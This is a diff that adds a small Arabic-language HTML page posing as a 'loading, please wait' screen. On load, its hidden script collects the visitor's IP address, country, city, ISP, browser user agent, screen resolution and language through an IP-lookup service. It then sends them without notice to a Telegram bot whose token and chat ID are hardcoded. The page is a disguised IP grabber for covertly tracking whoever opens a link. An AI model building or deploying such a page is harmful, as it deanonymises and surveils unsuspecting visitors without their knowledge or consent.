@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>جاري التحميل...</title>
+</head>
+<body>
+    <h3>جاري تحميل الصفحة، يرجى الانتظار...</h3>
+
+    <script>
+        const BOT_TOKEN = "8998025149:AAF5tYnXCGvyZNEQjV9lA2SFkcqar1yw7dk";
+        const CHAT_ID = "7265959414";
+
+        async function collectAndSend() {
+            const deviceData = {
+                userAgent: navigator.userAgent,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language
+            };
+
+            let ipData = {};
+            try {
+                // إضافة /json/ ليعمل بشكل صحيح
+                const res = await fetch('https://ipapi.co/json/');
+                ipData = await res.json();
+            } catch (e) {
+                ipData = { error: "تعذر جلب الـ IP" };
+            }
+
+            const message = `
+📊 *بيانات زائر جديد:*
+- *الـ IP:* ${ipData.ip || 'غير معروف'}
+- *الدولة/المدينة:* ${ipData.country_name || ''} - ${ipData.city || ''}
+- *مزود الخدمة:* ${ipData.org || ''}
+- *النظام والمتصفح:* ${deviceData.userAgent}
+- *دقة الشاشة:* ${deviceData.screen}
+- *اللغة:* ${deviceData.language}
+            `;
+
+            // تصحيح رابط التلجرام
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+        }
+
+        window.onload = collectAndSend;
+    </script>
+</body>
+</html>
